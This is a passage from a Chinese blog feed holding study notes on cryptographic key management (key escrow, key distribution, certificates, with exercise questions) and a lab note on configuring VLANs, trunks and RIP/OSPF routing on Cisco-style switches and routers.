title="密钥管理目的"></a><strong>密钥管理目的</strong></h5><ol><li>确保密钥的安全性</li><li>确保密钥的有效性</li><li>密钥的分发和分享</li><li>密钥的更新和轮换</li><li>密钥的备份和恢复</li><li>监控和审计</li></ol><h3 id="3-1-密钥的类型和组织结构"><a href="#3-1-密钥的类型和组织结构" class="headerlink" title="3.1 密钥的类型和组织结构"></a>3.1 密钥的类型和组织结构</h3><h4 id="3-1-1-关于密钥长度"><a href="#3-1-1-关于密钥长度" class="headerlink" title="3.1.1 关于密钥长度"></a>3.1.1 关于密钥长度</h4><p>​密钥是安全通信的必要长度之一</p><p>长度决定因素：</p><ol><li>数据价值</li><li>所需安全期</li><li>攻击者资源情况</li><li>计算机计算能力</li><li>加密算法的发展</li></ol><h4 id="3-1-2密钥的产生与存储"><a href="#3-1-2密钥的产生与存储" class="headerlink" title="3.1.2密钥的产生与存储"></a>3.1.2密钥的产生与存储</h4><p>产生与生成算法有关：大部分采用随机或伪随机过程</p><p>存储：有无介质，记录介质，物理介质等几种</p><h4 id="3-1-3密钥的使用-更新（替换）"><a href="#3-1-3密钥的使用-更新（替换）" class="headerlink" title="3.1.3密钥的使用&amp;更新（替换）"></a>3.1.3密钥的使用&amp;更新（替换）</h4><p>密钥的使用是指从存储介质上获得密钥，进行加密和解密的技术活动。</p><p>密钥的更新和替换是指定期更换密钥，以增强系统的安全性和保护密钥的长期有效性</p><h4 id="3-1-4密钥的备份与恢复"><a href="#3-1-4密钥的备份与恢复" class="headerlink" title="3.1.4密钥的备份与恢复"></a>3.1.4密钥的备份与恢复</h4><p>备份：在密钥使用期内，存储一个受保护的拷贝，用于恢复遭到破坏的密钥</p><p>恢复：当一个密钥由于某种原因被破坏了，在还没有泄露出去以前，从它的一个备份重新得到密钥的过程 </p><h4 id="3-1-5密钥的销毁和撤销"><a href="#3-1-5密钥的销毁和撤销" class="headerlink" title="3.1.5密钥的销毁和撤销"></a>3.1.5密钥的销毁和撤销</h4><p>销毁：一般针对公钥证书所对应的密钥，撤销后密钥不再具备使用效力。</p><p><strong>自然撤销：当证书到期时</strong></p><p><strong>按需撤销</strong></p><p>密钥更换后，原来的密钥必须销毁。密钥不再使用时，该密钥所有的拷贝都必须删除，生成或构造该密钥的所有信息也应该被全部删除。</p><h3 id="3-2-密钥托管技术"><a href="#3-2-密钥托管技术" class="headerlink" title="3.2 密钥托管技术"></a>3.2 密钥托管技术</h3><p><strong>定义</strong>：提供一种密钥备份与恢复的途径，也称为托管加密</p><p><strong>实现手段</strong>：把加密的数据和数据恢复密钥联系起来，通过一个防窜扰的托管加密芯片（Clipper芯片）来实现，该技术包括两个主要的核心内容：</p><ul><li>skipjack加密算法</li><li>LEAF</li></ul><p>密钥托管技术在具体实施时有<strong>三个主要环节</strong>：生产托管Clipper芯片、用芯片加密通信、无密钥存取</p><p><strong>技术组成</strong>：USC  KEC  DRC</p><p>（这几个模块的相互关系：这几个模块的相互 关系：USC用密钥K加密明文，并且在传送的同时传送一个数据 恢复域DRF（Data Recovery Field）， DRC则从KEC提供的和DRF 中包含的信息中恢复出密钥K来解密密文。）</p><p><img src="https://s2.loli.net/2024/11/03/B2UZmvDspiuQwPE.jpg" alt="9.jpg"></p><p><strong>1.USC</strong>：<br>(1)USC: USC由软件、硬件组成(一般情况下，硬件比 软件安全、不易发生窜扰)，提供数据加密&#x2F;解密的能力，执 行支持数据恢复的操作，同时也支持密钥托管。这种支持体 <span style = "color: blue;">现在将数据恢复域(DRF)附加到数据上</span>。</p><p>USC的功能表现在以下几个方面:<br>1 提供具有数据加解密能力的算法及支持密钥托管功能的硬 件或相关软件。<br>2 提供通信(包括电话、电子邮件及其他类型的通信，由相 关部⻔在法律许可的条件下对通信的监听后执行对突发事件 的解密)和数据存储的密钥托管。<br>3 提供突发解密的识别符(包括用户或USC的识别符、密钥 的识别符、KEC或托管代理机构的识别符)和密钥(包括属 于芯片单元密钥KEC所使用的全局系统密钥，密钥还可以是 公钥或私钥，私钥的备份以托管的方式有托管机构托管)。</p><p><strong>2.KEC</strong>：<br>(2)KEC:可以作为公钥证书密钥管理系统的组成部分，也 可以作为<span style = "color: blue;">通用密钥管理的基础部分</span>。它由密钥管理机构控制， 主要用于向DRC提供所需的数据和服务，管理着<span style = "color: blue;">数据恢复密钥 的存储、传送和使用</span>。数据恢复密钥主要用于生成数据加密密 钥，因此在使用托管密码加密时，<span style = "color: blue;">所有的托管加密数据都应与 被托管的数据恢复密钥联系起来</span>。</p><p>数据恢复密钥主要由以下内容组成:</p><ul><li><p>密钥选项</p></li><li><p>密钥分割</p></li><li><p>密钥的产生和分配</p></li><li><p>密钥托管时间</p></li><li><p>密钥更新</p></li><li><p>密钥的全部和部分</p></li><li><p>密钥存储</p></li></ul><p>KEC在向DRC提供诸如托管的密钥等服务时，服务包括:<br>1 <span style = "color: blue;">授权过程</span>:对操作或使用DRC的用户进行身份认证和对访问 加密数据的授权证明。<br>2 传送数据恢复密钥(主密钥不提供):如果数据恢复密钥是 会话密钥或产品密钥，KEC向DRC直接传送数据恢复密钥。密 钥传送时和有效期一起传送，有效期过后，密钥将被自动销 毁。<br>3 传送派生密钥:KEC向DRC提供由数据恢复密钥导出的另一 密钥(派生密钥)。比如受时间限制的密钥，被加密的数据仅 能在一个特定的有效时间段内被解密。<br>4 解密密钥:如果在DRF中使用主密钥加密数据加密密钥 时，KEC只向DRC发送解密密钥，而不发送主密钥。<br>5 执行⻔限解密:每个托管机构向DRC提供自己的解密结 果，由DRC合成这些结果并得到明文。 6数据传输:KEC和DRC之间的数据传输可以是人工的也 可以是电子的。</p><p><strong>3.DRC</strong><br>(3)DRC:由算法、协议和设备组成。DRC利用KEC所提 供的和在DRF中包含的信息中<span style = "color: blue;">恢复出数据加密密钥</span>，进而解 密密文，得到明文。仅仅在执行指定的已授权的数据恢复时 使用。<br>为了解密数据，要获得数据加密密钥， DRC必须采用下列方 法来获得数据加密密钥:<br>(1)从发送方S或接收方R接入:<br>(2)与KEC交互<br>(3)穷举搜索</p><p>(1)<span style = "color: blue;">从发送方S或接收方R接入:</span></p><p>首先要确定与S或R相关的数据恢复密钥能否恢复密钥K。如果只 能利用S的托管机构持有的子密钥才能获得K，当各个用户分别向专 ⻔的用户传送消息，尤其是在多个用户散布在不同的国家或使用不 同的托管机构时，DRC一定得获取密钥托管数据后才能进行实时解 密，这是有困难的;同样，当只有利用R的托管机构所持的子密钥才 能获得K时，也不可能实时解密专⻔用户传送出的消息。如果利用托 管机构的子集所持的密钥可以进行数据恢复，那么一旦获得了K，则 DRC就可以实时解密从USC发出或送入的消息。该系统就可以为双 向实时通信提供这种能力，但这要求通信双方使用相同的K。</p><p>(2)<span style = "color: blue;">与KEC交互 </span></p><p>对于每个数据加密密钥，S或R都有可能要求DRC或KEC有一次相互作用，其中对数据加密密钥要求DRC与KEC之间的联系是 在线的，以支持当每次会话密钥改变时的实时解密。</p><p>(3)<span style = "color: blue;">穷举搜索 </span></p><p>当托管代理机构把部分密钥返回给DRC时，DRC必须使用穷举搜索以确定密钥的其余部分。<br>DRC还使用技术、操作和法律等保护手段来控制什么是可以解 密的，比如可以对数据恢复进行严格的时间限制。这些保护措施提 供了KEC传送密钥时所要求的限制，而且认证机构也可以防止DRC 用密钥产生伪消息。</p><h3 id="3-3-密钥分配方案"><a href="#3-3-密钥分配方案" class="headerlink" title="3.3 密钥分配方案"></a>3.3 密钥分配方案</h3><h4 id="3-3-1分配依据"><a href="#3-3-1分配依据" class="headerlink" title="3.3.1分配依据"></a>3.3.1分配依据</h4><ol><li><p>减轻负担，提高效率——（自动密钥分配机制）</p></li><li><p>提高安全性——减少系统中驻留的密钥量</p></li></ol><h4 id="3-3-2常用密钥分配技术"><a href="#3-3-2常用密钥分配技术" class="headerlink" title="3.3.2常用密钥分配技术"></a>3.3.2常用密钥分配技术</h4><ol><li><p>静态分配技术</p><p>静态分配技术是一种由中心以离线方式预分配的技术，是“面对面”的分发，如到银行领取信用卡密钥，它具有安全性 好的特点，是长期沿用的传统密钥管理技术，不过，它必须 解决密钥的存储技术，静态分发只能以集中式机制存在。</p></li><li><p>动态分配技术<br>动态分配技术是一种“请求一分发”的在线分发技术，如在网上申请用户密钥，它具有方便、及时的特点，但这种分配 技术需要有专门的协议的支持，动态分配技术可采用有中心 或无中心的机制。</p></li></ol><h4 id="3-3-3-密钥分配体制"><a href="#3-3-3-密钥分配体制" class="headerlink" title="3.3.3 密钥分配体制"></a>3.3.3 密钥分配体制</h4><p><strong>集中式密钥分配体制</strong><br>集中式分配体制是引入一个中心服务器（通常称作密钥分配中<br>心或KDC），在这个体系中，团体中的任何一个实体与中心服务 器共享一个密钥。在这样的系统中，需要存储的密钥数量和团体 的人数量差不多，KDC接受用户的请求，为用户提供安全的密钥 分配服务。它的典型代表是Kerboros协议。</p><p><strong>分布式密钥分配体制</strong><br>分布式分配体制中网络中的主机具有相同的地位，他们之间的 密钥分配取决于他们之间的协商，比较著名的有Diffie-Hellman密 钥交换协议，但Diffie-Hellman密钥交换协议没有提供鉴别机制，不能抵抗中间人攻击。</p><h4 id="3-3-4密钥分配的基本方法"><a href="#3-3-4密钥分配的基本方法" class="headerlink" title="3.3.4密钥分配的基本方法"></a>3.3.4密钥分配的基本方法</h4><p>对于通信双方A和B，密钥分配可以有以下几种方法：<br><strong>1</strong> 密钥由A选定，然后通过物理方法安全地传递给B。<br><strong>2</strong> 密钥由可信赖的第三方C选取并通过物理方法安全地发送给A 和B。<br><strong>3</strong> 如果A和B事先已有一密钥，那么其中一方选取新密钥后，用已有的密钥加密新密钥发送给另一方。<br><strong>4</strong> 如果A和B都有一个到可信赖的第三方C的保密信道，那么C就可以为A和B选取密钥后安全地发送给A和B。<br><strong>5</strong> 如果A和B都在可信赖的第三方C发布自己的公开密钥，那么 他们用彼此的公开密钥进行保密通信。</p><h4 id="3-3-5对称密码技术的密钥分配方案"><a href="#3-3-5对称密码技术的密钥分配方案" class="headerlink" title="3.3.5对称密码技术的密钥分配方案"></a>3.3.5对称密码技术的密钥分配方案</h4><p>ANSI X9.17定义了三层密钥层次结构：<br>1）主密钥（KKMs），通过手工分配；</p><p>2）密钥加密密钥（KKs），通过在线分配；</p><p>3）数据密钥（KDs）。</p><h5 id="对称密码技术的密钥分配方案："><a href="#对称密码技术的密钥分配方案：" class="headerlink" title="对称密码技术的密钥分配方案："></a>对称密码技术的密钥分配方案：</h5><p>（1）集中式密钥分配方案</p><p><img src="https://s2.loli.net/2024/11/03/8WwL9POfmzdjFDl.jpg" alt="10.jpg"></p><p>（2）分布式密钥分配方案</p><p>  分布式密钥分配方案是指网络通信中各个通信方具有相同的地位，它们之间的密钥分配取决于它们之间的协商，不受何其 他方的限制。这种密钥分配方案要求有n个通信方的网络需要 保存[n(n-1)&#x2F;2]个主密钥，对于较大型的网络，这种方案是不适用的，但是在<span style = "color: blue;">一个小型网络或一个大型网络的局部范围</span>内，这种方案还是有用的。</p><p><img src="https://s2.loli.net/2024/11/03/4TE9Yca6JqM8vNL.jpg" alt="11.jpg"></p><h4 id="3-3-6非对称密码技术的密钥分配方案"><a href="#3-3-6非对称密码技术的密钥分配方案" class="headerlink" title="3.3.6非对称密码技术的密钥分配方案"></a>3.3.6非对称密码技术的密钥分配方案</h4><h4 id="1-公钥的分配："><a href="#1-公钥的分配：" class="headerlink" title="(1)公钥的分配："></a><strong>(1)公钥的分配：</strong></h4><ol><li><p><strong>分开发布</strong></p><p> 公开发布:是指用户将自己的公钥发送给另外一个参与 者，或者把公钥广播给相关人群。</p><p>这种方法有一个非常大的缺 点:任何人都可以伪造一个公钥冒充他人。</p></li><li><p><strong>公用目录</strong><br> 由一个可信任的系统或组织建立和管理维护公用目录，该公用目录维持一个公开动态目录。公用目录为每个参与者维护一 个目录项{标识符，公钥}，每个目录项的信息必须进行安全认 证。<strong>任何人</strong>都可以从这里获得需要保密通信的公钥。与公开发布公钥相比，这种方法的安全性高一些。</p><p>但也有一个致命的弱点， 如果攻击者成功地得到目录管理机构的私钥，就可以伪造公钥， 并发送给给其他人达到欺骗的目的</p></li><li><p><strong>公钥机构</strong></p></li></ol><p>​ 为更严格控制公钥从目录分配出去的公钥更加安全，为此需 要引入一个公钥管理机构<strong>来为各个用户建立、维护和控制动态的公用目录</strong>。与单纯的公用目录相比，该方法的安全性更高。但这 种方式也有它的缺点:由于每个用户要想和其他人通信都需求助 于公钥管理机构，因而管理机构可能会成为系统的瓶颈，而且由 管理机构维护的公用目录也容易被攻击者攻击。</p><ol start="4"><li><strong>公钥证书</strong></li></ol><p>  在不与公钥管理机构通信，又能证明其他通信方的公钥的可信度，实际上完全解决了公开发布及公用目录的安全问题。</p><p>采 用公钥证书是为了解决公开密钥管理机构的瓶颈问题。<br>公钥证书即数字证书是由授权中心CA(Certificate Authority)颁发的。</p><p><strong>证书的形式为CA&#x3D;ESKCA[T，IDA， PKA]，其中IDA是用户A的身份标识符，PKA是A的公钥，T是 当前时间戳，SKCA是CA的私钥。</strong></p><p>ps:公钥证书的发放过程：</p><p><img src="https://s2.loli.net/2024/11/05/cfoI9pu7gF6Cvhe.jpg" alt="12.jpg"></p><h4 id="2-利用非对称密码技术进行对称密码技术密钥的分配"><a href="#2-利用非对称密码技术进行对称密码技术密钥的分配" class="headerlink" title="(2)利用非对称密码技术进行对称密码技术密钥的分配:"></a>(2)利用非对称密码技术进行对称密码技术密钥的分配:</h4><ol><li><span style="color :blue;">简单分配:</span></li></ol><p>下图就是用 <strong>非对称密码技术建立会话密钥</strong> 的过程。</p><p><img src="https://s2.loli.net/2024/11/05/p32OPtFx451XISa.jpg" alt="13.jpg"></p><p>但这一分配方案容易 遭到主动攻击，假如攻击者已 经接入A和B双方的通信信 道，可以轻易地截获A、B双 方的通信。</p><ol start="2"><li><p><span style="color :blue;">具有保密和认证功能的密钥分配:</span></p><p>针对简单分配密钥的缺点，人们又设计了<strong>具有保密和认证功能的非对称密码技术的密钥分配</strong>，如下图所示。</p><p><img src="https://s2.loli.net/2024/11/05/mxbtqU9RHKOZNVg.jpg" alt="14.jpg"></p><p>密钥分配过程既具有保密性，又具有认证性，因此既可以防止被动攻击，也可以防止主动攻击。</p></li></ol><h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><p>1.请分析网络信息安全非常重要的原因。</p><p>2.请说明网络信息安全的内涵、特征及网络信息安全问题的原因。</p><p>3.请说明网络信息安全的目标和功能是什么。</p><p>4.请说明信息安全技术需求和安全策略。</p><p>5.请说明信息安全与区块链安全的区别和联系。</p><p>6.请说明近几年国内出台了哪些网络相关法律，这些法律的出台有什么重要意义。</p><ol><li><p>比较对称密码算法和非对称密码算法的优缺点，考虑在异地的两个人如何通过不可信的网络信道传输信息？</p></li><li><p>两个交易者A和B，假设B没有A的电话或邮箱的前提下，B如何相信A在网上发布的公钥就是真真的A发布的公钥，而不是C假冒A发布的？</p></li><li><p>请说明密码学在信息安全领域有哪些作用。</p></li><li><p>请说明密码系统的组成及它们之间的关系。</p></li><li><p>请说明如何认识密码系统的安全性。</p></li><li><p>请说明密码分析者对密码技术的攻击方式有哪些，并简要说明？</p></li><li><p>给定DES算法，在平均意义下，有多少个密钥可以把一个指定的输入分组加密得到一个指定的输出分组？</p></li><li><p>什么是非对称加密？和对称加密的区别？它的工作原理是什么？</p></li><li><p>利用 ab mod n&#x3D;((a mod n)(b mod n)) mod n,能把35^77 mod<br>83所需的76次乘法运算化简到11次吗，还可以进一步化简吗。</p></li><li><p>选择两个素数p &#x3D; 7和 q &#x3D; 11。计算n 和 φ（n）；选择公钥指数e&#x3D;17。计算私钥指数d；加密明文消息m&#x3D;5，计算密文。</p></li><li><p>为什么要引进密钥管理技术？</p></li><li><p>密钥管理系统涉及到密钥管理的哪些方面？</p></li><li><p>什么是密钥托管？</p></li><li><p>简述分布式密钥分配方案的过程。</p></li><li><p>简述集中式密钥分配方案的过程，并分析可能存在的潜在威胁。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【学习笔记】简单网络结构的搭建/vlan配置</title>
      <link href="/2024/10/23/vlan%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/10/23/vlan%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>(重新粗糙存档一下，过程图基本都丢失了，仅用于个人学习笔记使用)</p><ol><li>网络基础架构图</li><li>网络通信的原理</li><li>软件的使用</li></ol><p>​       a. 关于拓扑图： 接入层交换机，汇聚层交换机</p><p>​        b.技术实现6要求</p><h3 id="Vlan-trunk-不同vlan间的通信（三层交换技术）"><a href="#Vlan-trunk-不同vlan间的通信（三层交换技术）" class="headerlink" title="Vlan trunk 不同vlan间的通信（三层交换技术）"></a>Vlan trunk 不同vlan间的通信（三层交换技术）</h3><h4 id="交换机的基础命令-知识："><a href="#交换机的基础命令-知识：" class="headerlink" title="交换机的基础命令&#x2F;知识："></a>交换机的基础命令&#x2F;知识：</h4><ol><li><p>vlan: 虚拟局域网</p></li><li><p>vlan trunk stp 链路聚合</p></li><li><p>hsrp(vrrp)——公司内部的网络系统</p></li><li><p>将pc1和pc2放入不同vlan可以实现隔离</p><p>(同一虚拟网之间的电脑可以通信，不同的不可通信)</p></li><li><p>vlan范围： 1-4094</p></li><li><p><strong>关于常见接口类型：</strong></p></li></ol><p>​交换机常见接口类型：有Access和trunk</p><p>​Access用来接入终端，电脑，打印机，服务器</p><p>​trunk用在交换机与交换机之间</p><p>​trunk技术解决交换机之间传输vlan数据的问题</p><ol start="7"><li>命令行敲错后，跳出卡顿：ctrl+shift+1</li></ol><ul><li><p>三种模式：</p><ol><li><p>Enable </p></li><li><p>#</p></li><li><p>Config</p></li></ol></li><li><p>Exit 退出</p></li><li><p>查看都在#模式中；</p></li><li><p>配置文件的查看：<code>show run (running-config)</code></p></li><li><p>查看交换机的所有接口：<code>show IP interface brief</code></p></li><li><p>查看vlan：<code>show vlan</code></p></li><li><p>批量建立vlan两种办法: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vlan batch 1 to 30</span><br><span class="line"></span><br><span class="line">vlan batch 1 3 5 7 9</span><br></pre></td></tr></table></figure></li><li><p>默认情况下交换机所有端口都在：<code>vlan1</code> (1003-1005为特殊接口)（端口默认用在同一vlan中）</p></li><li><p>修改配置文件（配置在config）：</p></li><li><p>删除操作： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no switch mode access</span><br></pre></td></tr></table></figure></li><li><p>删除vlan: <code>Switch(config)#no vlan x</code></p></li><li><p>文件的保存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch#write</span><br><span class="line">Building configuration...</span><br></pre></td></tr></table></figure></li><li><p>重启命令：<code>reload</code></p></li><li><p>Ping网络：计算机 &gt; conmand prompt</p><p>（可通过ping另一pc的地址可以查看是否通路）</p></li><li><p>Trunk技术：承载不同的vlan，一般配置在交换机与交换机之间相连的端口</p></li><li><p>还原：先<code>show run</code>，然后复制文本到别处编辑（添加no），再粘贴回去</p><p>（show run也可用于检查）</p></li></ul><h5 id="关于汇聚层步骤的补充："><a href="#关于汇聚层步骤的补充：" class="headerlink" title="关于汇聚层步骤的补充："></a>关于汇聚层步骤的补充：</h5><ul><li><p><code>Ip addr</code> 的地址不是电脑的地址，是第三行需要输入的交换机的地址</p></li><li><p>当需要同时配置如：<code>f0/1</code> 和 <code>f0/2</code> 两个端口时，输入 <code>interface range f0/1,f0/2</code></p><p>设置网关：</p><p><img src="https://s2.loli.net/2024/10/23/Ln2vrqQdEgyRh1B.png" alt="vlan001.png"></p></li></ul><h5 id="对于服务器接入交换机："><a href="#对于服务器接入交换机：" class="headerlink" title="对于服务器接入交换机："></a>对于服务器接入交换机：</h5><ol><li>创建vlan</li><li>将接计算机的接口加入相应的vlan</li><li>配ip</li><li>ip routing</li></ol><p>展示路由表：<code>Show ip route</code></p><p>路由器中：</p><ol><li>添加模块时记得关电源</li><li>添加NM-4E</li></ol><p>手机：静态路由</p><p>工具：动态路由</p><p>以下三步以下图为例：</p><p><img src="https://s2.loli.net/2024/10/23/yVzjvkOlrdm3q7o.png" alt="vlan002.png"></p><h4 id="1-接入层（3步）"><a href="#1-接入层（3步）" class="headerlink" title="1. 接入层（3步）"></a>1. <strong>接入层（3步）</strong></h4><ol><li><p>创建vlan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config</span><br><span class="line">vlan 10</span><br><span class="line">vlan 20</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></li><li><p>接电脑端口加入vlan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">interface f0/1</span><br><span class="line">switchport mode access</span><br><span class="line">switchport access vlan 10</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">interface f0/2</span><br><span class="line">switchport mode access</span><br><span class="line">switchport access vlan 20</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></li><li><p>将连接的端口配trunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">interface f0/3</span><br><span class="line">switchport mode trunk</span><br></pre></td></tr></table></figure></li></ol><h4 id="2-汇聚层（2步）"><a href="#2-汇聚层（2步）" class="headerlink" title="2.  汇聚层（2步）"></a>2.  <strong>汇聚层（2步）</strong></h4><ol><li>点击PC——第二行mask——配置ip地址</li><li>在第三行填交换机地址</li></ol><h4 id="3-核心层（4步）"><a href="#3-核心层（4步）" class="headerlink" title="3. 核心层（4步）"></a>3. <strong>核心层（4步）</strong></h4><p>核心层步骤配置的是计算机的网关</p><ol><li><p>创建vlan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#vlan 10</span><br><span class="line"></span><br><span class="line">Switch(config-vlan)#vlan 20</span><br><span class="line"></span><br><span class="line">Switch(config-vlan)#exit</span><br></pre></td></tr></table></figure></li><li><p>配置trunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#interface f0/1(交换机与交换机之间的端口)</span><br><span class="line"></span><br><span class="line">Switch(config-if)#switchport trunk encapsulation dot1q</span><br><span class="line"></span><br><span class="line">Switch(config-if)#switchport mode trunk</span><br><span class="line"></span><br><span class="line">Switch(config-if)#exit</span><br></pre></td></tr></table></figure></li><li><p>开启三层功能(支持网络层)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#ip routing(开启三层功能，支持路由)</span><br></pre></td></tr></table></figure></li><li><p>配置ip地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#interface vlan 10</span><br><span class="line"></span><br><span class="line">Switch(config-if)#ip address 192.168.10.1 255.255.255.0（汇聚层步骤中设置的网关地址）</span><br><span class="line"></span><br><span class="line">Switch(config-if)#exit</span><br><span class="line">Switch(config)#interface vlan 20</span><br><span class="line"></span><br><span class="line">Switch(config-if)#ip address 192.168.20.1 255.255.255.0</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2024/10/23/ei9lZtoRkTVnEBP.png" alt="vlan003.png"></p><h2 id="配置内网"><a href="#配置内网" class="headerlink" title="配置内网"></a>配置内网</h2><ol><li><p><code>show ip route</code>查看带C的路</p></li><li><p>用<code>rip</code>加载带C的路(配置在核心交换机上)（config模式用router ip）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">route rip</span><br><span class="line">Network 192.168.10.0</span><br><span class="line">Network 192.168.20.0</span><br><span class="line">Network 192.168.30.0</span><br><span class="line">Network 192.168.40.0</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li><li><p>上网：电脑的dns server要输入dns的网关</p></li></ol><ul><li>三个server-pc分别代表web、ftp、dns</li></ul><ol start="4"><li><p>在ftp中设置用户名和密码</p></li><li><p>在第三台dns中分别在设置前两个名字（name处填）为 <code>www.web.com</code> 和 <code>www.ftp.com</code></p><ul><li>然后分别添加上各自的ip（Address处填）</li><li>配置完点击Add</li></ul><p><img src="https://s2.loli.net/2024/10/23/g7NeGRLuyYsD3Ih.png" alt="vlan004.png"></p></li><li><p>(判断能否上网)</p><ul><li>在pc——desktop——web browser处输入 <code>www.web.com</code>&#x2F;<code>www.ftp.com</code></li></ul></li><li><p>(登入ftp) 在conmand prompt输入如下图操作</p><p><img src="https://s2.loli.net/2024/10/23/VMkpuQftGOzoB62.png" alt="vlan005.png"></p></li></ol><h2 id="配置路由器"><a href="#配置路由器" class="headerlink" title="配置路由器"></a>配置路由器</h2><p>（注意设置显示接口）</p><p><img src="https://s2.loli.net/2024/10/23/e4obi6ECt7fVsI9.png" alt="vlan006.png"></p><ul><li><p>网段即地名</p></li><li><p><code>Ospt</code>只管公网的网段，无需管内网的网段</p><p>通俗讲：</p><ol><li><p>路由器：一般用在公网的；</p></li><li><p>交换机：一般用在内网的；</p></li></ol></li></ul><h5 id="路由器R0"><a href="#路由器R0" class="headerlink" title="路由器R0"></a>路由器R0</h5><ul><li><p>对于<code>f0/1</code>端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#router rip </span><br><span class="line">Switch(config-router)#network 192.168.60.0</span><br></pre></td></tr></table></figure></li><li><p>对于<code>f0/0</code>端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#router rip </span><br><span class="line">Switch(config-router)#network 192.168.70.0</span><br></pre></td></tr></table></figure></li><li><p>对于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  Switch(config)#interface f0/4</span><br><span class="line">  Switch(config-if)#no switchport </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- `Router(config)#interface f0/1`</span><br><span class="line"></span><br><span class="line">  Router(config-if)#no shutdown</span><br><span class="line">  Router(config-if)#ip address 192.168.60.2 255.255.255.0</span><br><span class="line">  </span><br><span class="line">- `Switch(config)#interface f0/7`</span><br><span class="line">  Switch(config-if)#no switchport </span><br><span class="line">  Switch(config-if)#ip address 192.168.70.1 255.255.255.0</span><br><span class="line">- `Router(config)#interface e1/0</span><br><span class="line">  Router(config-if)#no shutdown</span><br><span class="line">  Router(config-if)#ip address 192.168.70.2 255.255.255.0</span><br></pre></td></tr></table></figure></li></ul><h6 id="网络要全通：（路由问题）"><a href="#网络要全通：（路由问题）" class="headerlink" title="网络要全通：（路由问题）"></a>网络要全通：（路由问题）</h6><p>所有三层设备必须要内网的所有网段</p><p>接下来配置外网通</p><p>———————内&#x2F;外网通——————–</p><h4 id="路由器：配置ip-配置路由"><a href="#路由器：配置ip-配置路由" class="headerlink" title="路由器：配置ip 配置路由"></a>路由器：配置ip 配置路由</h4><p>（一下名称参考上图位置，名称不固定）</p><h5 id="R0"><a href="#R0" class="headerlink" title="R0."></a>R0.</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#inter e1/0</span><br><span class="line">Router(config-if)#ip addr 100.100.10.1 255.255.255.0</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#inter f0/0</span><br><span class="line">Router(config-if)#ip addr 192.168.70.2 255.255.255.0</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interf f0/1</span><br><span class="line">Router(config-if)#ip addr 192.168.60.2 255.255.255.0</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#router ospf 1</span><br><span class="line">Router(config-router)#network 100.100.10.0  0.0.0.255 area 0</span><br></pre></td></tr></table></figure><h5 id="R1"><a href="#R1" class="headerlink" title="R1:"></a>R1:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 